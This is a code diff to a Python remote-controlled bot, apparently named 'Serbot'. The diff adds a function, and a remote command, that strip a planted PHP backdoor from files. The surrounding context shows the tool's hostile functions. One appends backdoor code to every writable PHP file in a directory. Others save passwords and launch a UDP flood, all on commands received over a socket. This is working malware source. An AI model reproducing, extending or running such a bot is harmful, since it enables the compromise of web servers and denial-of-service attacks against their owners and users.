@@ -357,6 +357,21 @@ def debackdoor(thedir):
 				f = open(thefile, "a")
 				f.write(backdoor)
 				f.close()
+
+def rmbackdoor(thedir):
+	allphp = find_files(thedir, '*.php')
+
+	for thefile in allphp:
+		if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
+			f = open(thefile, "r")
+			inside = f.read()
+			f.close()
+
+			if ("#This is a Serbot property" in inside):
+				inside = inside.replace(backdoor, "")
+				f = open(thefile, "w")
+				f.write(inside)
+				f.close()
 #<--
 
 def savePass(password):
@@ -490,6 +505,12 @@ def main(host, port):
 						try:
 							debackdoor(commands[1])
 							s.send("[CLIENT] Backdoored\n")
+						except:
+							s.send("[CLIENT] Wrong arguments\n")
+					elif (commands[0] == "rmbackdoor"):
+						try:
+							rmbackdoor(commands[1])
+							s.send("[CLIENT] Malicious PHP Code Removed\n")
 						except:
 							s.send("[CLIENT] Wrong arguments\n")
 					elif (commands[0] == "udpflood"):
